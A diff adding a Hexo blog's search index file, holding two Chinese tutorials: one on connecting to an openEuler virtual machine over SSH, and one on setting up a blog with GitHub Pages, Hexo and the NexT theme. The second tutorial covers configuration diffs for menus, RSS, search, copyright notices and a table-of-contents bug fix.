@@ -1,0 +1,1107 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search>
+  <entry>
+    <title>为 openEuler 配置 SSH</title>
+    <url>/blog/20210711-configure-ssh-for-openeuler/</url>
+    <content><![CDATA[<h1 id="设置网卡"><a href="#设置网卡" class="headerlink" title="设置网卡"></a>设置网卡</h1><p>设置 &gt; 网络<br>设置“链接方式”：<code>桥接网卡</code><br>设置“界面名称”：选择本地能联网的网卡<br>保存</p>
+<h1 id="进入-openEuler"><a href="#进入-openEuler" class="headerlink" title="进入 openEuler"></a>进入 openEuler</h1><p>执行 <code>ip addr</code></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000</span><br><span class="line">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">    inet 127.0.0.1/8 scope host lo</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 ::1/128 scope host</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">2: enp0s3: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP group default qlen 1000</span><br><span class="line">    link/ether 00:00:00:00:00:00 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 192.168.0.1/24 brd 192.168.0.01 scope global dynamic noprefixroute enp0s3</span><br><span class="line">       valid_lft 81259sec preferred_lft 81259sec</span><br><span class="line">    inet6 ::1/128 scope link noprefixroute</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br></pre></td></tr></table></figure>
+
+<p>发现虚拟机的网络接口是 <code>192.168.0.1</code></p>
+<h1 id="SSH-链接虚拟机"><a href="#SSH-链接虚拟机" class="headerlink" title="SSH 链接虚拟机"></a>SSH 链接虚拟机</h1><p>在本地机启动命令行工具：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh &lt;userName&gt;@&lt;ip&gt;</span><br></pre></td></tr></table></figure>
+
+<p>显示：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">The authenticity of host &#x27;192.168.0.1 (192.168.0.1)&#x27; can&#x27;t be established.</span><br><span class="line">ECDSA key fingerprint is SHA256:xV1o/ZwaUNtEcmUmjp4nzOzpApXfXD+bnJCkl499LTw.</span><br><span class="line">Are you sure you want to continue connecting (yes/no/[fingerprint])?</span><br></pre></td></tr></table></figure>
+
+<p>输入 <code>yse</code> 或 <code>y</code><br>显示：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Warning: Permanently added &#x27;192.168.0.1&#x27; (ECDSA) to the list of known hosts.</span><br><span class="line">Authorized users only. All activities may be monitored and reported.</span><br><span class="line">root@192.168.0.1&#x27;s password:</span><br></pre></td></tr></table></figure>
+
+<p>输入用户密码<br>显示：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Authorized users only. All activities may be monitored and reported.</span><br><span class="line">Last login: xxx xxx xx xx:xx:xx xxxx</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Welcome to 4.19.90-2003.4.0.0036.oe1.x86_64</span><br><span class="line"></span><br><span class="line">System information as of time:  xxxx年 xx月 xx日 星期x xx:xx:xx xxx</span><br><span class="line"></span><br><span class="line">System load:    0.07</span><br><span class="line">Processes:      81</span><br><span class="line">Memory used:    13.2%</span><br><span class="line">Swap used:      0.0%</span><br><span class="line">Usage On:       9%</span><br><span class="line">IP address:     192.168.0.1</span><br><span class="line">Users online:   2</span><br></pre></td></tr></table></figure>
+
+<p>完成</p>
+<blockquote>
+<p><strong>参考资料：</strong></p>
+<ul>
+<li><a href="https://bbs.huaweicloud.com/forum/thread-100452-1-1.html">SSH的使用详解</a></li>
+</ul>
+</blockquote>
+]]></content>
+      <categories>
+        <category>初学者的 openEuler 之旅</category>
+      </categories>
+      <tags>
+        <tag>Linux</tag>
+        <tag>openEuler</tag>
+        <tag>SSH</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>使用 GitHub Pages、Hexo 和 NexT 主题搭建 Blog</title>
+    <url>/blog/20210728-build-a-hexo-blog-with-next-themes/</url>
+    <content><![CDATA[<p>最近打算把散落各地的文章汇聚过来，使用 GitHub Pages、Hexo 和 NexT 主题搭建 Blog，简单记录一下折腾过程，以备后用。</p>
+<span id="more"></span>
+
+<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p><a href="https://hexo.io/">Hexo</a>：快速、简洁且高效的博客框架；<br><a href="https://github.com/theme-next/hexo-theme-next">NexT</a>：一款风格优雅的高质量 Hexo 主题，自点点滴滴中用爱雕琢而成。<br>主要采用以上两个开源产品及其插件进行 Blog 开发，方案比较成熟，新版 Next 主题可配置性比之前高，用法与之前有些出入。</p>
+<h1 id="Hexo-安装"><a href="#Hexo-安装" class="headerlink" title="Hexo 安装"></a>Hexo 安装</h1><h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>安装 Hexo 需要提前装好 <a href="https://nodejs.org/en/">Node.js</a> 和 <a href="https://git-scm.com/">Git</a>。</p>
+<p>计划安装目前最新版 Hexo，所以需要安装 <code>10.13.0</code> 以上的 Node.js；Git 无具体版本要求。</p>
+<ul>
+<li>本地 Node.js 版本 <code>v14.16.0</code>；</li>
+<li>本地 Git 版本 <code>2.21.0.windows.1</code>。</li>
+</ul>
+<h2 id="Hexo-安装-1"><a href="#Hexo-安装-1" class="headerlink" title="Hexo 安装"></a>Hexo 安装</h2><ul>
+<li>全局安装 Hexo：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install hexo-cli -g</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>在 Blog 文件夹的父文件下执行初始化 Blog 命令：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hexo init &lt;fileName&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>&lt;fileName&gt;</code> 是 Blog 的文件夹名，执行此命令后，在执行该命令的文件目录下，新建了一个名为 <code>&lt;fileName&gt;</code> 的文件夹，这个新建的文件夹是 <strong>Blog 站点的根文件</strong>，Blog 站点的根文件夹下的 <code>_config.yml</code> 是<strong>Hexo 配置文件</strong>。</p>
+<ul>
+<li>进入上一步创建的文件夹：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd &lt;fileName&gt;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>安装 Hexo 相关依赖：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>启动 Hexo 本地服务，测试是否成功：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hexo server</span><br></pre></td></tr></table></figure>
+
+<p>也可以用 <code>hexo s</code> 代替上面的命令。</p>
+<p>这时命令行工具会出现：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">INFO  Hexo is running at http://localhost:4000 . Press Ctrl+C to stop.</span><br></pre></td></tr></table></figure>
+
+<p>可以通过浏览器访问 <code>http://localhost:4000</code> 来观察是否安装成功。</p>
+<blockquote>
+<p><strong>Tips：</strong> 光标移到命令行工具，按住 <code>ctrl</code> + <code>C</code>，关闭本地服务器。</p>
+</blockquote>
+<h1 id="安装-Next-主题"><a href="#安装-Next-主题" class="headerlink" title="安装 Next 主题"></a>安装 Next 主题</h1><h2 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h2><ul>
+<li>进入 <code>./themes</code> 文件夹，执行：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/theme-next/hexo-theme-next.git</span><br></pre></td></tr></table></figure>
+
+<p>此时，在 <code>./themes</code> 下应该会有一个 <code>next</code> 文件夹。</p>
+<ul>
+<li>通过文件管理器进入 <code>next</code> 文件夹，删除 <code>.git</code> 文件夹（这一步的目的是保证可以将个性化修改后的 <code>next</code> 文件夹上传到 GitHub）。</li>
+</ul>
+<h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><p>下载在 NexT 的 <a href="https://github.com/theme-next/hexo-theme-next/releases">Release 版本</a>，并将下载的压缩包解压到 <code>./themes</code> 下，此时 <code>themes</code> 文件夹下应该有一个 <code>next</code> 文件夹。</p>
+<blockquote>
+<p><strong>注意：</strong> 有两种方式可选，完成后，Blog 根文件夹下应该有一个 <code>themes</code> 文件夹，在 <code>themes</code> 文件夹下有一个 <code>next</code> 文件夹，在 <code>next</code> 根文件夹下有若干个文件、文件夹。<code>next</code> 是<strong>主题根文件</strong>，主题根文件下的 <code>_config.yml</code> 是<strong>主题配置文件</strong>。</p>
+</blockquote>
+<h2 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h2><p>修改 Hexo 配置文件：</p>
+<figure class="highlight diff"><figcaption><span>_config.yml</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="deletion">- theme: landscape</span></span><br><span class="line"><span class="addition">+ theme: next</span></span><br></pre></td></tr></table></figure>
+
+<p>在 Blog 根文件夹下，执行:</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo g</span><br><span class="line">hexo s</span><br></pre></td></tr></table></figure>
+
+<p>在浏览器访问本地服务器地址，查看是否已经成功更换主题。</p>
+<h1 id="配置与美化"><a href="#配置与美化" class="headerlink" title="配置与美化"></a>配置与美化</h1><h2 id="修改基本配置"><a href="#修改基本配置" class="headerlink" title="修改基本配置"></a>修改基本配置</h2><p>可按 <a href="https://hexo.io/zh-cn/docs/configuration.html">Hexo 官方配置文件说明</a> 对 Hexo 配置文件进行配置。</p>
+<h3 id="语言配置"><a href="#语言配置" class="headerlink" title="语言配置"></a>语言配置</h3><p>如果预览时发现网站出现非中文，可按以下两种方式进行配置：</p>
+<figure class="highlight diff"><figcaption><span>_config.yml</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="deletion">- language: en</span></span><br><span class="line"><span class="addition">+ language: zh-CN</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Bug-修复"><a href="#Bug-修复" class="headerlink" title="Bug 修复"></a>Bug 修复</h2><p>主题会有一些 Bug，记录一下打补丁方法。</p>
+<h3 id="中文文章-Toc-无法跳转"><a href="#中文文章-Toc-无法跳转" class="headerlink" title="中文文章 Toc 无法跳转"></a>中文文章 Toc 无法跳转</h3><p>在 Hexo 更新至 5.x 版本，Next 更新至 7.x 版本后，会出现文章的中文目录点击跳转失效的 bug。</p>
+<p>中文文章目录（TOC）点击可能跳转失败，<a href="https://github.com/theme-next/hexo-theme-next/pull/1540/files#">NexT 官方已经给出了修复方法</a>。</p>
+<p>下面记录一下：</p>
+<figure class="highlight diff"><figcaption><span>/themes/next/source/js/utils.js</span></figcaption><table><tr><td class="code"><pre><span class="line">      const sections = [...navItems].map(element =&gt; &#123;</span><br><span class="line">        var link = element.querySelector(&#x27;a.nav-link&#x27;);</span><br><span class="line"><span class="addition">+       var target = document.getElementById(decodeURI(link.getAttribute(&#x27;href&#x27;)).replace(&#x27;#&#x27;, &#x27;&#x27;));</span></span><br><span class="line">        // TOC item animation navigate.</span><br><span class="line">        link.addEventListener(&#x27;click&#x27;, event =&gt; &#123;</span><br><span class="line">          event.preventDefault();</span><br><span class="line"><span class="deletion">-         var target = document.getElementById(event.currentTarget.getAttribute(&#x27;href&#x27;).replace(&#x27;#&#x27;, &#x27;&#x27;));</span></span><br><span class="line">          var offset = target.getBoundingClientRect().top + window.scrollY;</span><br><span class="line">          window.anime(&#123;</span><br><span class="line">            targets  : document.scrollingElement,</span><br><span class="line">            duration : 500,</span><br><span class="line">            easing   : &#x27;linear&#x27;,</span><br><span class="line">            scrollTop: offset + 10</span><br><span class="line">          &#125;);</span><br><span class="line">        &#125;);</span><br><span class="line"><span class="deletion">-       return document.getElementById(link.getAttribute(&#x27;href&#x27;).replace(&#x27;#&#x27;, &#x27;&#x27;));</span></span><br><span class="line"><span class="addition">+       return target;</span></span><br><span class="line">      &#125;);</span><br></pre></td></tr></table></figure>
+
+<h2 id="其他配置与美化"><a href="#其他配置与美化" class="headerlink" title="其他配置与美化"></a>其他配置与美化</h2><h3 id="站内搜索"><a href="#站内搜索" class="headerlink" title="站内搜索"></a>站内搜索</h3><p>在站点根文件夹下，执行：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install hexo-generator-searchdb --save</span><br></pre></td></tr></table></figure>
+
+<p>在 Hexo 配置文件末尾添加：</p>
+<figure class="highlight diff"><figcaption><span>_config.yml</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="addition">+ search:</span></span><br><span class="line"><span class="addition">+   path: search.xml</span></span><br><span class="line"><span class="addition">+   field: post # 指定搜索范围，可选 post | page | all</span></span><br><span class="line"><span class="addition">+   format: html # 指定页面内容形式，可选 html | raw (Markdown) | excerpt | more</span></span><br><span class="line"><span class="addition">+   limit: 10000</span></span><br></pre></td></tr></table></figure>
+
+<p>将 NexT 主题配置文件 <code>local_search</code> 项目修改如下：</p>
+<figure class="highlight diff"><figcaption><span>/themes/next/_config.yml</span></figcaption><table><tr><td class="code"><pre><span class="line">  local_search:</span><br><span class="line"><span class="deletion">-   enable: false</span></span><br><span class="line"><span class="addition">+   enable: true</span></span><br><span class="line">    # If auto, trigger search by changing input.</span><br><span class="line">    # If manual, trigger search by pressing enter key or search button.</span><br><span class="line">    trigger: auto # 每次输入改变都执行搜索</span><br><span class="line">    # Show top n results per article, show all results by setting to -1</span><br><span class="line">    top_n_per_article: 1 # 每篇文章显示的搜索结果数量</span><br><span class="line">    # Unescape html strings to the readable one.</span><br><span class="line">    unescape: false</span><br><span class="line">    # Preload the search data when the page loads.</span><br><span class="line">    preload: false</span><br></pre></td></tr></table></figure>
+
+<p><code>local_search</code> 的其他配置项可根据注释修改。</p>
+<h3 id="添加-rss"><a href="#添加-rss" class="headerlink" title="添加 rss"></a>添加 rss</h3><p>在站点根文件夹下，执行：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install hexo-generator-feed --save</span><br></pre></td></tr></table></figure>
+
+<p>在 Hexo 配置文件末尾添加：</p>
+<figure class="highlight diff"><figcaption><span>_config.yml</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="addition">+ # Extensions</span></span><br><span class="line"><span class="addition">+ ## Plugins: http://hexo.io/plugins/</span></span><br><span class="line"><span class="addition">+ plugins: hexo-generate-feed</span></span><br><span class="line"><span class="addition">+ </span></span><br><span class="line"><span class="addition">+ #Feed Atom</span></span><br><span class="line"><span class="addition">+ feed:</span></span><br><span class="line"><span class="addition">+   type: atom</span></span><br><span class="line"><span class="addition">+   path: atom.xml</span></span><br><span class="line"><span class="addition">+   limit: 20</span></span><br></pre></td></tr></table></figure>
+
+<p>在 NexT 主题配置文件，给配置项 <code>social</code> 添加 <code>rss: atom.xml || rss</code>：</p>
+<figure class="highlight diff"><figcaption><span>/themes/next/_config.yml</span></figcaption><table><tr><td class="code"><pre><span class="line">  social:</span><br><span class="line"><span class="addition">+   rss: atom.xml || rss</span></span><br></pre></td></tr></table></figure>
+
+<p><code>rss</code> 在 <code>social</code> 中的顺序会影响实际图标的顺序。</p>
+<h3 id="文末版权说明配置"><a href="#文末版权说明配置" class="headerlink" title="文末版权说明配置"></a>文末版权说明配置</h3><p>在 NexT 主题配置文件，将配置项 <code>creative_commons</code> 的 <code>post</code> 修改为 <code>true</code>：</p>
+<figure class="highlight diff"><figcaption><span>/themes/next/_config.yml</span></figcaption><table><tr><td class="code"><pre><span class="line">  creative_commons:</span><br><span class="line">    license: by-nc-sa</span><br><span class="line">    sidebar: false</span><br><span class="line"><span class="deletion">-   post: false</span></span><br><span class="line"><span class="addition">+   post: true</span></span><br><span class="line">    language:</span><br></pre></td></tr></table></figure>
+
+<p>修改 <code>/themes/next/layout/_partials/post/post-copyright.swig</code> 文件：</p>
+<figure class="highlight diff"><figcaption><span>/themes/next/layout/_partials/post/post-copyright.swig</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="addition">+ &#123;% if page.copyright %&#125;</span></span><br><span class="line">    &#123;%- set ccIcon = &#x27;&lt;i class=&quot;fa fa-fw fa-creative-commons&quot;&gt;&lt;/i&gt;&#x27; %&#125;</span><br><span class="line">    &#123;%- set ccText = theme.creative_commons.license | upper %&#125;</span><br><span class="line"></span><br><span class="line">    &lt;div&gt;</span><br><span class="line">    &lt;ul class=&quot;post-copyright&quot;&gt;</span><br><span class="line">      &lt;li class=&quot;post-copyright-author&quot;&gt;</span><br><span class="line">        &lt;strong&gt;&#123;&#123; __(&#x27;post.copyright.author&#x27;) + __(&#x27;symbol.colon&#x27;) &#125;&#125; &lt;/strong&gt;</span><br><span class="line">        &#123;&#123;- page.author or author &#125;&#125;</span><br><span class="line">      &lt;/li&gt;</span><br><span class="line">      &lt;li class=&quot;post-copyright-link&quot;&gt;</span><br><span class="line">        &lt;strong&gt;&#123;&#123; __(&#x27;post.copyright.link&#x27;) + __(&#x27;symbol.colon&#x27;) &#125;&#125;&lt;/strong&gt;</span><br><span class="line">        &#123;&#123; next_url(page.permalink, page.permalink, &#123;title: page.title&#125;) &#125;&#125;</span><br><span class="line">      &lt;/li&gt;</span><br><span class="line">      &lt;li class=&quot;post-copyright-license&quot;&gt;</span><br><span class="line">        &lt;strong&gt;&#123;&#123; __(&#x27;post.copyright.license_title&#x27;) + __(&#x27;symbol.colon&#x27;) &#125;&#125; &lt;/strong&gt;</span><br><span class="line">        &#123;&#123;- __(&#x27;post.copyright.license_content&#x27;, next_url(ccURL, ccIcon + ccText)) &#125;&#125;</span><br><span class="line">      &lt;/li&gt;</span><br><span class="line">    &lt;/ul&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line"><span class="addition">+ &#123;% endif %&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>在 <code>post</code> 模板中增加 <code>copyright</code> 这一配置项：</p>
+<figure class="highlight diff"><figcaption><span>/scaffolds/post.md</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="addition">+ copyright: false # 是否开启版权声明，true 是； false 否。</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="配置标签、分类、归档、关于页面"><a href="#配置标签、分类、归档、关于页面" class="headerlink" title="配置标签、分类、归档、关于页面"></a>配置标签、分类、归档、关于页面</h3><h4 id="配置标签页面"><a href="#配置标签页面" class="headerlink" title="配置标签页面"></a>配置标签页面</h4><p>在 Blog 根文件夹下执行：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hexo new page tags # 新建“标签”页面</span><br></pre></td></tr></table></figure>
+
+<p>在主题配置文件对 <code>menu</code> 进行配置：</p>
+<figure class="highlight diff"><figcaption><span>/themes/next/_config.yml</span></figcaption><table><tr><td class="code"><pre><span class="line">  menu:</span><br><span class="line">    home: / || home</span><br><span class="line">    #about: /about/ || user</span><br><span class="line"><span class="deletion">-   #tags: /tags/ || tags</span></span><br><span class="line"><span class="addition">+   tags: /tags/ || tags</span></span><br><span class="line">    #categories: /categories/ || th</span><br><span class="line">    archives: /archives/ || archive</span><br><span class="line">    #schedule: /schedule/ || calendar</span><br><span class="line">    #sitemap: /sitemap.xml || sitemap</span><br><span class="line">    #commonweal: /404/ || heartbeat</span><br></pre></td></tr></table></figure>
+
+<p>修改 tags 页面：</p>
+<figure class="highlight diff"><figcaption><span>/source/tags/index.md</span></figcaption><table><tr><td class="code"><pre><span class="line">  ---</span><br><span class="line"><span class="deletion">- title: tags</span></span><br><span class="line"><span class="addition">+ title: 标签</span></span><br><span class="line">  date: 2021-07-27 21:58:57</span><br><span class="line"><span class="addition">+ type: &quot;tags&quot;</span></span><br><span class="line">  ---</span><br></pre></td></tr></table></figure>
+
+<p>在 <code>post</code> 模板中增加 <code>tags</code> 这一配置项：</p>
+<figure class="highlight diff"><figcaption><span>/scaffolds/post.md</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="addition">+ tags: # 标签</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="配置分类页面"><a href="#配置分类页面" class="headerlink" title="配置分类页面"></a>配置分类页面</h4><p>在 Blog 根文件夹下执行：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hexo new page categories # 新建“分类”页面</span><br></pre></td></tr></table></figure>
+
+<p>在主题配置文件对 <code>menu</code> 进行配置：</p>
+<figure class="highlight diff"><figcaption><span>/themes/next/_config.yml</span></figcaption><table><tr><td class="code"><pre><span class="line">  menu:</span><br><span class="line">    home: / || home</span><br><span class="line">    #about: /about/ || user</span><br><span class="line">    tags: /tags/ || tags</span><br><span class="line"><span class="deletion">-   #categories: /categories/ || th</span></span><br><span class="line"><span class="addition">+   categories: /categories/ || th</span></span><br><span class="line">    archives: /archives/ || archive</span><br><span class="line">    #schedule: /schedule/ || calendar</span><br><span class="line">    #sitemap: /sitemap.xml || sitemap</span><br><span class="line">    #commonweal: /404/ || heartbeat</span><br></pre></td></tr></table></figure>
+
+<p>修改 categories 页面：</p>
+<figure class="highlight diff"><figcaption><span>/source/categories/index.md</span></figcaption><table><tr><td class="code"><pre><span class="line">  ---</span><br><span class="line"><span class="deletion">- title: categories</span></span><br><span class="line"><span class="addition">+ title: 文章分类</span></span><br><span class="line">  date: 2021-07-27 21:58:35</span><br><span class="line"><span class="addition">+ type: &quot;categories&quot;</span></span><br><span class="line">  ---</span><br></pre></td></tr></table></figure>
+
+<p>在 <code>post</code> 模板中增加 <code>categories</code> 这一配置项：</p>
+<figure class="highlight diff"><figcaption><span>/scaffolds/post.md</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="addition">+ categories: # 分类</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="配置归档页面"><a href="#配置归档页面" class="headerlink" title="配置归档页面"></a>配置归档页面</h4><p>默认已经开启，如果没有按以下方式配置：</p>
+<p>在 Blog 根文件夹下执行：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hexo new page archives # 新建“归档”页面</span><br></pre></td></tr></table></figure>
+
+<p>在主题配置文件对 <code>menu</code> 进行配置：</p>
+<figure class="highlight diff"><figcaption><span>/themes/next/_config.yml</span></figcaption><table><tr><td class="code"><pre><span class="line">  menu:</span><br><span class="line">    home: / || home</span><br><span class="line">    #about: /about/ || user</span><br><span class="line">    tags: /tags/ || tags</span><br><span class="line">    categories: /categories/ || th</span><br><span class="line"><span class="deletion">-   #archives: /archives/ || archive</span></span><br><span class="line"><span class="addition">+   archives: /archives/ || archive</span></span><br><span class="line">    #schedule: /schedule/ || calendar</span><br><span class="line">    #sitemap: /sitemap.xml || sitemap</span><br><span class="line">    #commonweal: /404/ || heartbeat</span><br></pre></td></tr></table></figure>
+
+<p>修改 archives 页面：</p>
+<figure class="highlight diff"><figcaption><span>/source/archives/index.md</span></figcaption><table><tr><td class="code"><pre><span class="line">  ---</span><br><span class="line"><span class="deletion">- title: archives</span></span><br><span class="line"><span class="addition">+ title: 归档</span></span><br><span class="line">  date: 2021-07-27 21:58:46</span><br><span class="line"><span class="addition">+ type: &quot;archives&quot;</span></span><br><span class="line">  ---</span><br></pre></td></tr></table></figure>
+
+<h4 id="配置关于页面"><a href="#配置关于页面" class="headerlink" title="配置关于页面"></a>配置关于页面</h4><p>在 Blog 根文件夹下执行：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hexo new page about # 新建“关于”页面</span><br></pre></td></tr></table></figure>
+
+<p>在主题配置文件对 <code>menu</code> 进行配置：</p>
+<figure class="highlight diff"><figcaption><span>/themes/next/_config.yml</span></figcaption><table><tr><td class="code"><pre><span class="line">  menu:</span><br><span class="line">    home: / || home</span><br><span class="line"><span class="deletion">-   #about: /about/ || user</span></span><br><span class="line"><span class="addition">+   about: /about/ || user</span></span><br><span class="line">    tags: /tags/ || tags</span><br><span class="line">    categories: /categories/ || th</span><br><span class="line">    archives: /archives/ || archive</span><br><span class="line">    #schedule: /schedule/ || calendar</span><br><span class="line">    #sitemap: /sitemap.xml || sitemap</span><br><span class="line">    #commonweal: /404/ || heartbeat</span><br></pre></td></tr></table></figure>
+
+<p>修改 about 页面：</p>
+<figure class="highlight diff"><figcaption><span>/source/about/index.md</span></figcaption><table><tr><td class="code"><pre><span class="line">  ---</span><br><span class="line"><span class="deletion">- title: about</span></span><br><span class="line"><span class="addition">+ title: 关于</span></span><br><span class="line">  date: 2021-07-27 21:45:02&quot;</span><br><span class="line">  ---</span><br></pre></td></tr></table></figure>
+
+<p>后面可以增加其他希望在“关于”页面添加的内容。</p>
+<h3 id="调整菜单排列顺序"><a href="#调整菜单排列顺序" class="headerlink" title="调整菜单排列顺序"></a>调整菜单排列顺序</h3><p>在主题配置文件对 <code>menu</code> 进行配置,调整各项目的顺序：</p>
+<figure class="highlight text"><figcaption><span>/themes/next/_config.yml</span></figcaption><table><tr><td class="code"><pre><span class="line">menu:</span><br><span class="line">  home: / || home</span><br><span class="line">  tags: /tags/ || tags</span><br><span class="line">  categories: /categories/ || th</span><br><span class="line">  archives: /archives/ || archive</span><br><span class="line">  #schedule: /schedule/ || calendar</span><br><span class="line">  #sitemap: /sitemap.xml || sitemap</span><br><span class="line">  #commonweal: /404/ || heartbeat</span><br><span class="line">  about: /about/ || user</span><br></pre></td></tr></table></figure>
+
+<h3 id="增加顶置功能"><a href="#增加顶置功能" class="headerlink" title="增加顶置功能"></a>增加顶置功能</h3><p>在页面增加 <code>sticky: 0</code> 即可，<code>0</code> 代表不顶置，可以将 <code>0</code>替换成其他数字，数字越大，权重越大，排名越靠前。</p>
+<p>可以在 <code>post</code> 模板，增加 <code>sticky</code> 这一配置项。</p>
+<figure class="highlight diff"><figcaption><span>/scaffolds/post.md</span></figcaption><table><tr><td class="code"><pre><span class="line">sticky: 0</span><br></pre></td></tr></table></figure>
+
+<h3 id="首页折叠配置"><a href="#首页折叠配置" class="headerlink" title="首页折叠配置"></a>首页折叠配置</h3><p>NexT 主题自带 2 种首页折叠方式：</p>
+<ol>
+<li>配置 <code>description</code> 项目：</li>
+</ol>
+<figure class="highlight diff"><table><tr><td class="code"><pre><span class="line"><span class="addition">+ # description: XXXXXXXXXXX # 折叠简介</span></span><br></pre></td></tr></table></figure>
+
+<p><code>XXXXXXXXXXX</code> 将作为简介显示在首页，其他内容将折叠，点击 <code>阅读全文》</code>，才能了解更多文章内容。</p>
+<ol start="2">
+<li>在正文增加 <code>&lt;!-- more --&gt;</code>, 前面的正文将作为简介显示在首页，其他内容将折叠，点击 <code>阅读全文》</code>，才能了解更多文章内容。</li>
+</ol>
+<p>配置 <code>post</code> 模板：</p>
+<figure class="highlight diff"><figcaption><span>/scaffolds/post.md</span></figcaption><table><tr><td class="code"><pre><span class="line">  ---</span><br><span class="line">  title: &#123;&#123; title &#125;&#125;</span><br><span class="line">  date: &#123;&#123; date &#125;&#125; # &quot;2013/7/13 20:46:25&quot;</span><br><span class="line">  sticky: 0 # 顶置</span><br><span class="line">  categories: # 分类</span><br><span class="line">  tags: # 标签</span><br><span class="line"><span class="addition">+ # description: &#x27;&#x27; # 折叠简介</span></span><br><span class="line">  copyright: false # 是否开启版权声明，true 是； false 否。</span><br><span class="line">  ---</span><br><span class="line">  </span><br><span class="line"><span class="addition">+ &lt;!-- more --&gt;</span></span><br><span class="line"><span class="addition">+ </span></span><br></pre></td></tr></table></figure>
+
+<h2 id="GitHub-部署"><a href="#GitHub-部署" class="headerlink" title="GitHub 部署"></a>GitHub 部署</h2><p>如果托管在 GitHub Pages。</p>
+<p>有两种方式访问 GitHub 的 GitHub Pages，这两种方式体现在 URL 的不同：<code>https://username.github.io/</code> 和 <code>https://username.github.io/ProjectName/</code>，其中 <code>username</code> <strong>自己的</strong>是用户 id，<code>ProjectName</code> 是项目名。</p>
+<h3 id="注册-GitHub-账号"><a href="#注册-GitHub-账号" class="headerlink" title="注册 GitHub 账号"></a>注册 GitHub 账号</h3><p>过程略。</p>
+<h3 id="建立-GitHub-远程仓库"><a href="#建立-GitHub-远程仓库" class="headerlink" title="建立 GitHub 远程仓库"></a>建立 GitHub 远程仓库</h3><p>如果把 <code>https://username.github.io/</code> 作为 Blog 首页地址，则将仓库命名 <code>username.github.io</code>，其中 <code>username</code> 是<strong>自己的</strong>用户 id，无法修改。</p>
+<p>如果把 <code>https://username.github.io/ProjectName/</code> 作为 Blog 首页地址，则将仓库命名 <code>ProjectName</code>，其中 <code>username</code> 是<strong>自己的</strong>用户 id，无法修改。</p>
+<blockquote>
+<p><strong>注意：</strong> 远程仓库应该不含任何文件、文件夹。否则后续处理会有些麻烦。</p>
+</blockquote>
+<h3 id="配置-ssh"><a href="#配置-ssh" class="headerlink" title="配置 ssh"></a>配置 ssh</h3><p>为了避免处理每次都推送都需要输入账号、密码，这里需要配置 ssh。本地已经配置过的，这里就不用配置了。具体过程略。</p>
+<h3 id="网址配置"><a href="#网址配置" class="headerlink" title="网址配置"></a>网址配置</h3><ul>
+<li>如果把 <code>https://username.github.io/</code> 作为 Blog 首页地址，则在 Hexo 配置文件设置：</li>
+</ul>
+<figure class="highlight diff"><figcaption><span>_config.yml</span></figcaption><table><tr><td class="code"><pre><span class="line">  # URL</span><br><span class="line">  ## Set your site url here. For example, if you use GitHub Page, set url as &#x27;https://username.github.io/project&#x27;</span><br><span class="line"><span class="deletion">- url: http://example.com</span></span><br><span class="line"><span class="addition">+ url: https://username.github.io</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>如果把 <code>https://username.github.io/ProjectName/</code> 作为 Blog 首页地址则，在 Hexo 配置文件设置：</li>
+</ul>
